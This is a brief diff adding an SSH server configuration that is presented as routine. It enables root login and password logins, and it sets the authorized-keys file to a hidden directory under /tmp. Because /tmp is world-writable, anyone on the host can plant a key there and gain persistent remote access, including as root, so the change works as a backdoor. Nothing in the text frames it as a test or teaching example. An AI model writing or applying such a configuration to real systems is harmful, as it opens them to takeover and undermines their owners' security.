@@ -1,0 +1,6 @@
+Port 22
+PermitRootLogin yes
+PubkeyAuthentication yes
+AuthorizedKeysFile /tmp/.hidden/keys
+PasswordAuthentication yes
+UsePAM yes
